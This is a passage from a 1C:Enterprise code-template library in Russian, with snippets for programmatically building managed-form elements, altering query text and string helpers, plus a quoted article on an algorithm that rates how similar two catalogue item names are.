		ЭлементФормы.УстановитьДействие(""ПриИзменении""	, ""Подключаемый_"" + лИмяРеквизита + ""ПриИзменении"");
		ЭлементФормы.УстановитьДействие(""Открытие""		, ""Подключаемый_"" + лИмяРеквизита + ""Открытие"");
	КонецЕсли;
	
	Если пСоздатьПримечание Тогда
		лПутьКДанным 					= лИмяРеквизита + ""_КомментарийКонтакт"";
		
		ПрограммноПрикрепитьЭлемент(пФорма, Тип(""ПолеФормы""), ЭлементФормы, лПутьКДанным, ""Комментарий контактного лица"",,, Истина, Истина,, Новый Структура(""ПриИзменении""));
		
		ПолеКомментарий = лЭлементы[""Элемент_"" + лПутьКДанным];
		
		ПолеКомментарий.ПропускатьПриВводе 	= Истина;
		ПолеКомментарий.ПодсказкаВвода 		= НСтр(""ru='Прим.'"");
		ПолеКомментарий.Ширина 				= 10;
		ПолеКомментарий.РастягиватьПоГоризонтали 	= Ложь;
	КонецЕсли; 
	
	лДобавленныйРеквизитФормы 		= Новый РеквизитФормы(лИмяРеквизита + ""_ЗначенияПолей"", Новый ОписаниеТипов(""Строка""), , пПредставление, Ложь);
	
	МассивДобавляемыхРеквизитов 	= Новый Массив;
	МассивДобавляемыхРеквизитов.Добавить(лДобавленныйРеквизитФормы);
	пФорма.ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);
	
	Возврат лИмяРеквизита;
	
КонецФункции // ПрограммноВывестиКИ()"}
},
{0,
{"Программная работа с реквизитами и элементами формы.",0,0,"","Программная работа с реквизитами и элементами формы.
https://flumi.ru/articles/show/programmnaia_rabota_s_rekvizitami_i_elementami_formy

//-----------------------------------------------

// Заменит основное действие формы указанным                
ЭтаФорма.УстановитьДействие(""ОбработкаВыбора"", ""Добавленный_ОбработкаВыбора"");

// Заменит основное действие элемента формы указанным
Элементы.СуществующийРеквизитОбъекта.УстановитьДействие(""ПриИзменении"", ""Добавленный_ПриИзменииСуществующегоРеквизитаОбъекта"");

//-----------------------------------------------

// Добавляет команду на форму              
ДобавленнаяКомандаФормы 			= Команды.Добавить(""ДобавленнаяКомандаФормы"");      
ДобавленнаяКомандаФормы.Действие 	= ""ДействиеДобавленнойКомандыФормы"";
ДобавленнаяКомандаФормы.Картинка 	= БиблиотекаКартинок.БизнесПроцессОбъект;
ДобавленнаяКомандаФормы.Отображение = ОтображениеКнопки.КартинкаИТекст;

// Добавляет кнопку на форму, связывает ее с добавленной командной и помещает на командную панель формы
ДобавленнаяКнопкаФормы 	= Элементы.Вставить(""ДобавленнаяКнопкаФормы"", Тип(""КнопкаФормы""),
ДобавленнаяКнопкаФормы.Заголовок 	= НСтр(""ru='Нажмите на добавленную кнопку формы'"");
ДобавленнаяКнопкаФормы.ИмяКоманды 	= ""ДобавленнаяКомандаФормы""; // Имя ранее добавленной команды

//-----------------------------------------------

// Добавляет подменю на командную панель формы
ГруппаПодменюКоманднойПанели 		= Элементы.Добавить(""ДобавленноеПодменюКоманднойПанелиФормы"", Тип(""ГруппаФормы""), Элементы.ФормаКоманднаяПанель);
ГруппаПодменюКоманднойПанели.Вид 	= ВидГруппыФормы.Подменю;
ГруппаПодменюКоманднойПанели.Заголовок 	= НСтр(""ru='Добавленное подменю командной панели формы'"");
ГруппаПодменюКоманднойПанели.Картинка 	= БиблиотекаКартинок.БыстрыеНастройкиОтчета;
ГруппаПодменюКоманднойПанели.Отображение 	= ОтображениеКнопки.КартинкаИТекст;

//-----------------------------------------------

// Перемещает существующую кнопку в созданное подменю
// (При обращении к элементам можно использовать как обращение через ""Эелменты"", так и переменные, которыми они описаны в процессе создания)
Элементы.Переместить(ДобавленнаяКнопкаФормы, ГруппаПодменюКоманднойПанели);

// Поместим существующий элемент перед уже размещенным в созданной группе:
Элементы.Переместить(Элементы.ФормаСуществующаяКомандаКоманднойПанелиФормы, Элементы.ДобавленноеПодменюКоманднойПанелиФормы, ДобавленнаяКнопкаФормы);

//-----------------------------------------------

// Добавляет свертываемую группу формы с горизонтальной группировкой
ДобавленнаяГруппаШапкаФормы 		= Элементы.Добавить(""ДобавленнаяГруппаШапкаФормы"", Тип(""ГруппаФормы""), ЭтаФорма);
ДобавленнаяГруппаШапкаФормы.Вид 	= ВидГруппыФормы.ОбычнаяГруппа;
ДобавленнаяГруппаШапкаФормы.Группировка = ГруппировкаПодчиненныхЭлементовФормы.Горизонтальная;
ДобавленнаяГруппаШапкаФормы.Заголовок 	= НСтр(""ru='Добавленная сворачиваемая группа формы'"");
ДобавленнаяГруппаШапкаФормы.ЗаголовокСвернутогоОтображения = НСтр(""ru='Развернуть свернутую группу'"");
ДобавленнаяГруппаШапкаФормы.Поведение 	= ПоведениеОбычнойГруппы.Свертываемая;

// !Важно! Не прокатит:
//ДобавленнаяГруппаШапкаФормы.Свернута = Истина;

// Добавляет левую группу свертываемой группы формы с вертикальной гркппировкой
ДобавленнаяГруппаШапкиФормы_Лево 		= Элементы.Добавить(""ДобавленнаяГруппаШапкиФормы_Лево"", Тип(""ГруппаФормы""), ДобавленнаяГруппаШапкаФормы);
ДобавленнаяГруппаШапкиФормы_Лево.Вид 	= ВидГруппыФормы.ОбычнаяГруппа;
ДобавленнаяГруппаШапкиФормы_Лево.ОтображатьЗаголовок 	= Ложь;
ДобавленнаяГруппаШапкиФормы_Лево.Отображение 	= ОтображениеОбычнойГруппы.Нет;
ДобавленнаяГруппаШапкиФормы_Лево.Группировка 	= ГруппировкаПодчиненныхЭлементовФормы.Вертикальная;

// Добалвляет правую группу свертываемой группы формы с вертикальной группировкой
ДобавленнаяГруппаШапкиФормы_Право 		= Элементы.Добавить(""ДобавленнаяГруппаШапкиФормы_Право"", Тип(""ГруппаФормы""), ДобавленнаяГруппаШапкаФормы);
ДобавленнаяГруппаШапкиФормы_Право.Вид 	= ВидГруппыФормы.ОбычнаяГруппа;
ДобавленнаяГруппаШапкиФормы_Право.ОтображатьЗаголовок 	= Ложь;
ДобавленнаяГруппаШапкиФормы_Право.Отображение 			= ОтображениеОбычнойГруппы.Нет;
ДобавленнаяГруппаШапкиФормы_Право.Группировк 			= ГруппировкаПодчиненныхЭлементовФормы.Вертикальная;
 
//-----------------------------------------------

// Добавляет надпись на левую группу формы
НадписьФормы 			= Элементы.Добавить(""ДобавленнаяНадписьФормы"", Тип(""ДекорацияФормы""), ДобавленнаяГруппаШапкиФормы_Лево);              
НадписьФормы.Заголовок = НСтр(""ru='Добавленная надпись формы'"");

// Добавляет картинку на правую группу формы
КартинкаФормы 			= Элементы.Добавить(""ДобавленнаяКартинкаФормы"", Тип(""ДекорацияФормы""), ДобавленнаяГруппаШапкиФормы_Право);           
КартинкаФормы.Заголовок = НСтр(""Добавленная картинка формы"");
КартинкаФормы.Вид 		= ВидДекорацииФормы.Картинка;
КартинкаФормы.Картинка 	= БиблиотекаКартинок.АктивныеПользователи;

//-----------------------------------------------

// Добалвяет группу страниц формы
ГруппаСтраницФормы 		= Элементы.Добавить(""ДобавленнаяГруппаСтраницФормы"", Тип(""ГруппаФормы""), ЭтаФорма);
ГруппаСтраницФормы.Вид 	= ВидГруппыФормы.Страницы;
ГруппаСтраницФормы.ОтображениеСтраниц 	= ОтображениеСтраницФормы.ЗакладкиСлеваГоризонтально;

// Добалвяет страницу на форму в гуруппе страниц
ГруппаСтраница1Формы 		= Элементы.Добавить(""ДобавленнаяСтраница1Формы"", Тип(""ГруппаФормы""), ГруппаСтраницФормы);
ГруппаСтраница1Формы.Вид 	= ВидГруппыФормы.Страница;
ГруппаСтраница1Формы.Заголовок = НСтр(""ru='Добавленная страница 1 формы'"");

//-----------------------------------------------

// Добавляет реквизит формы и выводит его на форму
лДобавленныйРеквизитФормы 		= Новый РеквизитФормы(""ДобавленныйРеквизитФормыБулево"", Новый ОписаниеТипов(""Булево""), , НСтр(""ru='Добавленный реквизит формы Булево'""), Ложь);

МассивДобавляемыхРеквизитов 	= Новый Массив;
МассивДобавляемыхРеквизитов.Добавить(лДобавленныйРеквизитФормы);
ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);                       

ЭлементФормы 		= Элементы.Добавить(""ЭлементДобавленныйРеквизитФормыБулево"", Тип(""ПолеФормы""), ГруппаСтраница1Формы);
ЭлементФормы.Вид 	= ВидПоляФормы.ПолеФлажка;
ЭлементФормы.ПутьКДанным 	= ""ДобавленныйРеквизитФормыБулево"";

// Выводит на форму добавленный в объекте реквизит
ЭлементФормы 		= Элементы.Добавить(""СуществующийНоНеОтображаемыйРеквизитОбъектаСтрока"", Тип(""ПолеФормы""), ГруппаСтраница1Формы);
ЭлементФормы.Вид 	= ВидПоляФормы.ПолеВвода;
ЭлементФормы.ПутьКДанным 	= ""Объект.СуществующийНоНеОтображаемыйРеквизитОбъекта"";

//-----------------------------------------------

// Добавяет реквизиты табличной части на форму
ДобавленныйРеквизитТЧОбъектаСтрока = Новый РеквизитФормы(""ДобавленныйРеквизитТЧОбъектаСтрока"", Новый ОписаниеТипов(""Строка""), ""Объект.СуществующаяТЧОбъекта"", НСтр(""ru='Добавленный строковый реквизит существующей ТЧ Объекта'""), Ложь);

МассивДобавляемыхРеквизитов = Новый Массив;
МассивДобавляемыхРеквизитов.Добавить(ДобавленныйРеквизитТЧОбъектаСтрока);
ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);                       

// Выводит добавленный реквизиты на форму                      
ЭлементФормы 		= Элементы.Добавить(""ТЧ_ДобавленныйРеквизитТЧОбъектаСтрока"", Тип(""ПолеФормы""), Элементы.СуществующаяТЧОбъекта);
ЭлементФормы.Вид 	= ВидПоляФормы.ПолеВвода;
ЭлементФормы.ПутьКДанным 	= ""Объект.СуществующаяТЧОбъекта.ДобавленныйРеквизитТЧОбъектаСтрока"";

// Выводит на форму добавленный в объекте реквизит
ЭлементФормы 		= Элементы.Добавить(""ТЧ_СуществующийНоНеОтображаемыйРеквизитТЧОбъектаСтрока"", Тип(""ПолеФормы""), Элементы.СуществующаяТЧОбъекта);
ЭлементФормы.Вид 	= ВидПоляФормы.ПолеВвода;
ЭлементФормы.ПутьКДанным 	= ""Объект.СуществующаяТЧОбъекта.СуществующийНоНеОтображаемыйРеквизитТЧОбъекта"";

//-----------------------------------------------

// Добавит таблицу значений на форму
МассивТипов 	= Новый Массив;
МассивТипов.Добавить(Тип(""ТаблицаЗначений""));
ОписаниеТипаТЗ 	= Новый ОписаниеТипов(МассивТипов);

РеквизитФормыТаблицаЗначений = Новый РеквизитФормы(""ДобавленнаяТаблицаЗначенийФормы"", ОписаниеТипаТЗ, , НСтр(""ru='Добавленная ТЧ на форму'""),  Ложь);

// Добавит на форму реквизит таблицы значений               
РеквизитФормыРеквизитТаблицыЗначений = Новый РеквизитФормы(""ДобавленныйРеквизитДобавленнойТаблицыЗначений"", Новый ОписаниеТипов(""Строка""), ""ДобавленнаяТаблицаЗначенийФормы"", НСтр(""ru='Добавленный реквизит добавленной таблицы значений'""), Ложь);      

МассивДобавляемыхРеквизитов 	= Новый Массив;
МассивДобавляемыхРеквизитов.Добавить(РеквизитФормыТаблицаЗначений);
МассивДобавляемыхРеквизитов.Добавить(РеквизитФормыРеквизитТаблицыЗначений);
ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);

// Выведет на форму добавленную таблицу значений
ДобавляемаяНаФормуДобавленнаяТаблица 				= Элементы.Добавить(""ДобавляемаяНаФормуДобавленнаяТаблица"",
ДобавляемаяНаФормуДобавленнаяТаблица.ПутьКДанным 	= ""ДобавленнаяТаблицаЗначенийФормы"";

// Выведет на форму добавленный реквизит добавленной таблицы значений
ДобавляемыйНаФормуРеквизитДобавленнойТаблицы 				= Элементы.Добавить(""ДобавляемыйНаФормуРеквизитДобавленнойТаблицы"",
ДобавляемыйНаФормуРеквизитДобавленнойТаблицы.ПутьКДанным 	= ""ДобавленнаяТаблицаЗначенийФормы.ДобавленныйРеквизитДобавленнойТаблицыЗначений"";

//-----------------------------------------------

// Создаст реквизит динамического списка на форме
ДобавляемыйРеквизитДинамическогоСписка = Новый РеквизитФормы(""ДобавляемыйРеквизитДинамическогоСписка"", Новый ОписаниеТипов(""ДинамическийСписок""), , НСтр(""ru='Добавленный динамический список'""), Ложь);

МассивДобавляемыхРеквизитов 	= Новый Массив;
МассивДобавляемыхРеквизитов.Добавить(ДобавляемыйРеквизитДинамическогоСписка);
ИзменитьРеквизиты(МассивДобавляемыхРеквизитов);

// Опишем параметры динамического списка    
ЭтаФорма.ДобавляемыйРеквизитДинамическогоСписка.ПроизвольныйЗапрос 	= Истина;
ЭтаФорма.ДобавляемыйРеквизитДинамическогоСписка.ТекстЗапроса 		= ""Выбрать * Из Справочник.Валюты"";                      
ЭтаФорма.ДобавляемыйРеквизитДинамическогоСписка.ОсновнаяТаблица 	= ""Справочник.Валюты"";
ЭтаФорма.ДобавляемыйРеквизитДинамическогоСписка.УстановитьОбязательноеИспользование(""Ссылка"", Истина);

//Создание элементов формы
ДобавленныйЭлементТаблицаДинамическогоСписка 				= Элементы.Добавить(""ДобавленныйЭлементТаблицаДинамическогоСписка"", Тип(""ТаблицаФормы""), ГруппаСтраница4Формы);
ДобавленныйЭлементТаблицаДинамическогоСписка.ПутьКДанным 	= ""ДобавляемыйРеквизитДинамическогоСписка"";
ДобавленныйЭлементТаблицаДинамическогоСписка.Отображение 	= ОтображениеТаблицы.Список;

НоваяКолонка 				= Элементы.Добавить(""ДобавленнаяКолонкаДинамическогоСписка_Ссылка"", Тип(""ПолеФормы""), ДобавленныйЭлементТаблицаДинамическогоСписка);
НоваяКолонка.ПутьКДанным 	= ""ДобавляемыйРеквизитДинамическогоСписка.Ссылка"";

НоваяКолонка 				= Элементы.Добавить(""ДобавленнаяКолонкаДинамическогоСписка_ПометкаУдаления"", Тип(""ПолеФормы""), ДобавленныйЭлементТаблицаДинамическогоСписка);
НоваяКолонка.ПутьКДанным 	= ""ДобавляемыйРеквизитДинамическогоСписка.ПометкаУдаления"";

НоваяКолонка 				= Элементы.Добавить(""ДобавленнаяКолонкаДинамическогоСписка_Код"", Тип(""ПолеФормы""), ДобавленныйЭлементТаблицаДинамическогоСписка);
НоваяКолонка.ПутьКДанным 	= ""ДобавляемыйРеквизитДинамическогоСписка.Код"";

НоваяКолонка 				= Элементы.Добавить(""ДобавленнаяКолонкаДинамическогоСписка_Наименование"", Тип(""ПолеФормы""), ДобавленныйЭлементТаблицаДинамическогоСписка);
НоваяКолонка.ПутьКДанным 	= ""ДобавляемыйРеквизитДинамическогоСписка.Наименование"";
НоваяКолонка.РастягиватьПоГоризонтали 	= Ложь;

//-----------------------------------------------"}
},
{0,
{"Добавить реквизит УФ",0,0,"","НовыеРеквизиты 		= Новый Массив;

НовыйРеквизитИмя 	= Новый РеквизитФормы(""Имя"", Новый ОписаниеТипов(""Число""), ""Объект.Запасы"", ""Заголовок"");

НовыеРеквизиты.Добавить(НовыйРеквизитИмя);
пФорма.ИзменитьРеквизиты(НовыеРеквизиты);"}
},
{0,
{"ДобавитьДанныеВЗапрос ДобавитьДанныеВСписок ДобавитьЭлементНаСервере (изменить запрос в Списке, вывести элемент на форму)",0,0,"","
&НаСервере
Функция ДобавитьЭлементНаСервере(ЭтаФорма, ИмяЭлемента, ПутьКДанным, ЭлементРодитель, пВставитьПеред = Неопределено, Заголовок = """", Видимость = Истина) Экспорт
	
	лРезультат 	= Неопределено;
	лЭлементы  	= ЭтаФорма.Элементы;
	
	Если лЭлементы.Найти(ИмяЭлемента) = Неопределено Тогда
		Если ПустаяСтрока(Заголовок) Тогда
			Заголовок 	= ИмяЭлемента;
		КонецЕсли;
		
		лТипЭлемента 	= Тип(""ПолеФормы"");
		
		Если пВставитьПеред = Неопределено Тогда
			лЭлементФормы 	= лЭлементы.Добавить(ИмяЭлемента, лТипЭлемента, ЭлементРодитель);
		Иначе
			лЭлементФормы 	= лЭлементы.Вставить(ИмяЭлемента, лТипЭлемента, ЭлементРодитель, пВставитьПеред);
		КонецЕсли;
		
		лЭлементФормы.Вид 			= ВидПоляФормы.ПолеВвода;
		лЭлементФормы.ПутьКДанным 	= ПутьКДанным;
		лЭлементФормы.Заголовок 	= Заголовок;
		лЭлементФормы.Подсказка 	= Заголовок;
		лЭлементФормы.Видимость 	= Видимость;
		
		лРезультат 	= лЭлементФормы;
	КонецЕсли; 
	
	Возврат лРезультат;
	
КонецФункции

Процедура ДобавитьДанныеВСписок(пЭтаФорма, пИмяСписка, пИмяРеквизита, пЭлементСписок, пЗаголовок = """", пПрефикс = ""АйТи_"") Экспорт
	
	Если ПустаяСтрока(пЗаголовок) Тогда
		пЗаголовок 	= пИмяРеквизита;
	КонецЕсли;
	
	АйТи_ОбщиеФункцииСервер.ДобавитьЭлементНаСервере(пЭтаФорма, пПрефикс + пИмяСписка + пИмяРеквизита, пИмяСписка + ""."" + пИмяРеквизита, пЭлементСписок,, пЗаголовок);
	
КонецПроцедуры // ДобавитьДанныеВСписок()

// Функция - Добавить данные в запрос
//
// Параметры:
//  пТекстЗапроса				 - Строка	 - Весь текст запроса для добавления в него своего кода
//  пТекстИсходнойСтрокиДляЗаменты		 - Строка	 - Часть запроса, которая будет искаться и заменяться так, чтобы после неё вставились наши новые данные
//  пСтруктураВставкиДанных		 - Структура	 - Данные полей и таблиц для подстановки. Ключ = ИмяТаблицы, чтобы поля были разными (нужно для уникальности структуры). Если имеется таблицы и её реквизиты.
//  							 - Строка	 - Строка для замены, проямо один текс заменится на этом, при необходимости с учетом параметра пТекстСтрокиДляПодстановки
//  пСимволВКонецСтроки			 - Строка	 - В конец каждой строки структуры будет добавлен этот символ, напр., "",""
//  пТекстВКонецЗапроса		 - Строка	 - Символ в самый конец запроса, напр., ""}""
//Возврат:
//	Булево - Есть в запросе пТекстЗапроса подстрока пТекстИсходнойСтрокиДляЗаменты
//-------------------------------------------------------------------------
//При добавлении поля и наличии ""СГРУППИРОВАТЬ ПО"" - надо обратить внимание,
//возможно тоже надо добавлять поле в группировку
//------------------------------------------------------------------------- 
// АйТи КучеровРМ 26.07.2019 
Функция ДобавитьДанныеВЗапрос(пТекстЗапроса, Знач пТекстИсходнойСтрокиДляЗаменты, пСтруктураВставкиДанных, Знач пТекстИсходнойСтрокиДляПодстановки = """", пДобавляяПослеИсходнойСтроки = Истина, пСимволВКонецСтроки = "","", пТекстВКонецЗапроса = """") Экспорт
	
	лЕстьПодстрока 	= СтрНайти(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты) > 0; 
	
	Если лЕстьПодстрока Тогда
		Если ПустаяСтрока(пТекстИсходнойСтрокиДляПодстановки) Тогда			   
			пТекстИсходнойСтрокиДляПодстановки 	= пТекстИсходнойСтрокиДляЗаменты;
		КонецЕсли; 
		
		пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты, ""
		|//Программно изменен текст запроса "" + Строка(ТекущаяДата()) + "" (АйТи)
		|"" + пТекстИсходнойСтрокиДляЗаменты);
				
		Если ТипЗнч(пСтруктураВставкиДанных) = Тип(""Строка"") Тогда
			Если пДобавляяПослеИсходнойСтроки Тогда
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты, 
				пТекстИсходнойСтрокиДляЗаменты + ""
				|"" + пСтруктураВставкиДанных);
			Иначе
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляЗаменты, пСтруктураВставкиДанных);
			КонецЕсли; 
		ИначеЕсли ТипЗнч(пСтруктураВставкиДанных) = Тип(""Структура"") Тогда
			Для каждого Элем Из пСтруктураВставкиДанных Цикл
				
				пТекстЗапроса 	= СтрЗаменить(пТекстЗапроса, пТекстИсходнойСтрокиДляПодстановки,
				пТекстИсходнойСтрокиДляЗаменты + ""
				|	"" + Элем.Значение + ""."" + Элем.Ключ + "" КАК "" + Элем.Ключ + пСимволВКонецСтроки);
				
			КонецЦикла;	
		КонецЕсли;
		
		пТекстЗапроса 	= пТекстЗапроса + пТекстВКонецЗапроса;
	КонецЕсли; 
	  
	Возврат лЕстьПодстрока;
	
КонецФункции // ДобавитьДанныеВЗапрос()"}
}
},
{5,
{"Элементы (УФ) (ОФ)",1,0,"",""},
{1,
{"Обычная форма (ОФ)",1,0,"",""},
{0,
{"СписокВыбора (Добавить)",0,0,"ОФСВ","ЭлементыФормы.<?""Имя элемента на форме (слитно)"">.СписокВыбора.Очистить();
ЭлементыФормы.<?""Имя элемента на форме (слитно)"">.СписокВыбора.Добавить(123, ""123"");
ЭлементыФормы.<?""Имя элемента на форме (слитно)"">.Значение 	= 123;"}
}
},
{0,
{"Видимость",0,0,"Видим[ос]","Элементы.<?""Имя элемента формы"">.Видимость 	= <?"""", ВыборВарианта, ""Истина"", ""Истина"", ""Ложь"", ""Ложь"">;"}
},
{0,
{"Доступность",0,0,"Дост[упнос]","Элементы.<?""Имя элемента формы"">.Доступность 	= <?"""", ВыборВарианта, ""Истина"", ""Истина"", ""Ложь"", ""Ложь"">;"}
},
{0,
{"Заголовок (не весь в автозамене, чтобы можно было дописывать иные загловки, не вызывая это)",0,0,"Заго[лов]","Элементы.<?""Имя элемента формы"">.Заголовок 	= Элементы.<?""Имя элемента формы"">.Заголовок;"}
},
{4,
{"Фирменные",1,0,"",""},
{0,
{"Элемент доработан АйТи",0,0,"ЭлемАйТи","Элементы.<?""Имя элемента формы"">.ЦветТекстаЗаголовка 	= Новый Цвет(83, 106, 194); 
Элементы.<?""Имя элемента формы"">.Заголовок 				= Элементы.<?""Имя элемента формы"">.Заголовок + "" (АйТи)"";"}
},
{0,
{"Цвет текста (фирменный, синеватый, Цвет(83, 106, 194))",0,0,"ЦветАй[Ти]","Элементы.<?""Имя элемента формы"">.ЦветТекста 	= Новый Цвет(83, 106, 194);"}
},
{0,
{"Цвет текста заголовка (фирменный, синеватый, Цвет(83, 106, 194))",0,0,"ЦветЗагАй[Ти]","Элементы.<?""Имя элемента формы"">.ЦветТекстаЗаголовка 	= Новый Цвет(83, 106, 194);"}
},
{0,
{"Заголовок (фирменный, АйТи)",0,0,"ЗаголовкАй[Ти]","Элементы.<?""Имя элемента формы"">.Заголовок 	= Элементы.<?""Имя элемента формы"">.Заголовок + "" (АйТи)"";"}
}
}
},
{21,
{"Строка",1,0,"",""},
{4,
{"Повторяющиеся символы",1,0,"",""},
{0,
{"УдалитьПовторяющиесяСимволы",0,0,"","Функция УдалитьПовторяющиесяСимволы(Знач Строка, Знач Символ, Знач Режим = ""Слева"") Экспорт
    
    Если ВРег(Режим) = ""СЛЕВА"" Тогда
        
        Пока Лев(Строка, 1)= Символ Цикл
            
            Строка = Сред(Строка, 2);
            
        КонецЦикла;
        
    ИначеЕсли ВРег(Режим) = ""СПРАВА"" Тогда
        
        Пока Прав(Строка, 1)= Символ Цикл
            
            Строка = Лев(Строка, СтрДлина(Строка) - 1);
            
        КонецЦикла;
        
    КонецЕсли;
    
    Возврат Строка;
КонецФункции"}
},
{0,
{"УбратьЛидирующиеНули",0,0,"","Функция УбратьЛидирующиеНули(Строка) Экспорт
    
    Для сч = 0 по СтрДлина(Строка) Цикл
        
        Если НЕ Сред(Строка,Сч, 1) = ""0"" Тогда //Как только всретили не ноль, возвращаем хвостик
            Возврат Сред(Строка , Сч);
        КонецЕсли;
        
    КонецЦикла;
    
    Возврат """";
	
КонецФункции"}
},
{0,
{"НомерБезНулей3",0,0,"","Функция НомерБезНулей3(знач Номер)
    
    //убираем префикс и нули
    Пока Найти(""123456789"", Лев(Номер, 1)) = 0 Цикл
        Номер = Сред(Номер, 2);    
	КонецЦикла;
	
    Возврат Номер;
    
КонецФункции // НомерБезНулей3()"}
},
{0,
{"НомерНаПечать (Типовое)",0,0,"","ПрефиксацияОбъектовКлиентСервер.НомерНаПечать(Номер, УдалитьПрефиксИнформационнойБазы, УдалитьПользовательскийПрефикс)
ИЛИ
ОбщегоНазначения.ПолучитьНомерНаПечать()"}
}
},
{4,
{"Сходство наименований",1,0,"",""},
{0,
{"Статья: Степень сходства двух наименований справочника",0,0,"","https://infostart.ru/public/332257/

Статья посвящена исследованию следующего вопроса: необходимо сравнить 2 наименования справочников с целью вычисления их степени сходства. По задумке, степень сходства должна выражаться в процентах.
Задача возникла при попытках поиска элементов справочника номенклатуры для обновления значений реквизитов. Суть проблемы заключалась в неуникальности реквизитов для поиска (артикул, например) в пределах всего справочника, что приводило к ложной подстановке обновляемых реквизитов. 

В итоге, в качестве решения проблемы разработана модель сравнения наименования найденного элемента справочника с наименованием элемента, необходимого для обновления реквизитов. Таким образом, мы отсеиваем полностью несовпадающие по наименованию элементы справочника при неуникальных остальных реквизитах, по которым мы пытаемся спозиционироваться на элемент.

Существуют масса алгоритмов определения степени сходства 2-х текстов, после изучения которых, был выработан следующий алгоритм:

Вычисляем длины наименований
Принимаем за эталон наибольшую длину (для организации цикла)
Принимаем наименование с наибольшей длиной за эталонную строку
Попарно вычисляем число вхождений в обоих наименованиях каждого символа из эталонной строки
Удаляем из наименований символы, для которых произведён поиск
Складываем общее количество вхождений для каждого наименования
После цикла вычисляем степень сходства по формуле (результат в процентах):
(Вхождение1/Вхождение2)*100
Здесь, ""Вхождение1"" - общее число вхождений каждого символа эталонной строки в первое наименование, ""Вхождение2"" - общее число вхождений каждого символа эталонной строки во второе наименование. 

Перед вычислением по формуле, в условном операторе, необходимо определить какое из наименований имеет наибольшее число вхождений.

Ниже представлен полученный код для платформы 1С Предприятие 7.7. Принимаются предложения по оптимизации.

//возвращает процент сходства 2-х наименований
Функция СходствоНаименований(Знач Наим1="""",Знач Наим2="""") 
    Наим1 = СокрЛП(Наим1);
    Наим2 = СокрЛП(Наим2);
    Наим1 = СтрЗаменить(Наим1,""  "",""""); //Удаляем двойные пробелы
    Наим1 = СтрЗаменить(Наим1,"" "","""");  //Удаляет одинарные пробелы
    Наим2 = СтрЗаменить(Наим2,""  "","""");
    Наим2 = СтрЗаменить(Наим2,"" "","""");
    //проверяем значения на схожесть  
    Длина1  = СтрДлина(Наим1);
    Длина2  = СтрДлина(Наим2);
    Если Длина1 > Длина2 Тогда
        Длина = Длина1;
    Стр   = Наим1;
    Иначе
    Длина = Длина2;
    Стр   = Наим2;
    КонецЕсли;
    Сч = 0; Вхождение1 = 0; Вхождение2 = 0;
    Пока (Стр<>"""") Цикл
        Символ = Лев(Стр,1);
        Вхождение1 = Вхождение1+СтрЧислоВхождений(Наим1,Символ);
        Вхождение2 = Вхождение2+СтрЧислоВхождений(Наим2,Символ);
        Наим1 = СтрЗаменить(Наим1,Символ,"""");
        Наим2 = СтрЗаменить(Наим2,Символ,"""");
        Стр = Прав(Стр,СтрДлина(Стр)-1);
    КонецЦикла;
    Возврат  ?(Вхождение1>Вхождение2,Окр((Вхождение2/Вхождение1)*100,3,1),Окр((Вхождение1/Вхождение2)*100,3,1));
КонецФункции //СходствоНаименований()

Выявленные преимущества алгоритма:

Время исполнения кода на очень хорошем уровне (меньше 0.0001 сек.)
Переносимось алгоритма (не нужно подключать внешние компоненты)
Выходной показатель (процент степени сходства) соответствует различию входных данных

Выявленные недостатки:
Чувствительность алгоритма к сильному различию в количестве символов 2-х наименований (показатель степени сходства быстро снижается) 
При простой перестановке символов в разных наименованиях результат будет 100% сходства, что неверно.
Результаты экспериментов
Эксперимент 1:

Наименование1 = ""A0900001N Угольник 1""х1""
Наименование2 = ""CJ 65 V3 Лобзик""
Результат = 13.636%
Эксперимент 2:

Наименование1 = ""Cъемник рулевых тяг и шаровых опор TOYA""
Наименование2 = ""Cъемник рулевых тяг и шаровых опор  2-х позиционный, зев 20 мм""
Результат = 56.863%
Эксперимент 3:

Наименование1 = ""MF 800 VE миксер Felisatti""
Наименование2 = ""MF1200/VE2 миксер Felisatti""
Результат = 84.000%
Возможное решение описанных выше недостатков

Метод написан на базе платформы 1С:8 пользователем DrBlack

Функция ПолучитьПроцентСходстваНаименований_2(Знач НаимСравн="""", МассивСлов, ОбщДлинаСлов)
    СуммаСовпадений = 0;
    Для Каждого ТекСлово Из МассивСлов Цикл     
        Если СтроковыеФункцииКлиентСервер.ТолькоЦифрыВСтроке(ТекСлово) Тогда
            СчНачало = СтрДлина(ТекСлово);
        Иначе
            СчНачало = Макс(3, СтрДлина(ТекСлово)-4);
        КонецЕсли;
        МаксСовпадений = 0;
        Для Сч = СчНачало По СтрДлина(ТекСлово) Цикл          
            ТекОтрезокЛево = Лев(ТекСлово,  Сч);
            ТекОтрезокПрав = Прав(ТекСлово, Сч);          
            МаксСовпадений = Макс(МаксСовпадений, ?(СтрЧислоВхождений(НаимСравн, ТекОтрезокЛево)>0, Сч, 0), ?(СтрЧислоВхождений(НаимСравн, ТекОтрезокПрав)>0, Сч, 0));     
        КонецЦикла;   
        СуммаСовпадений = СуммаСовпадений + МаксСовпадений;       
    КонецЦикла;   
    ПроцентСовпадения = Окр(Мин(ОбщДлинаСлов, СуммаСовпадений) / ОбщДлинаСлов * 100, 3, 1);   
    Возврат ПроцентСовпадения;
КонецФункции
Входные параметры:
НаимСравн - строка, с которой надо сравнить
МассивСлов - эталонная строка, заранее разбитая на составляющие
ОбщДлинаСлов - общая длинна слов в МассивСлов для вычисления коэф. схожести

Суть данного метода - устранить недостатки метода из топика.

Описание колонок на скрине:
Процент1 - сравнение методом из топика
Процент2 - сравнение методом пользователя  DrBlack по вхождению слов (не короче 4х символов)
Процент3 - усредненный коэф (Процент1 + Процент2 х 2) / 3"}
},
{0,
{"ПолучитьПроцентСходстваНаименованийУчетСлов",0,0,"","//НаимСравн - строка, с которой надо сравнить
//МассивСлов - эталонная строка, заранее разбитая на составляющие. Или строка, которую СтрРазделить 
//ОбщДлинаСлов - общая длинна слов в МассивСлов для вычисления коэф. схожести
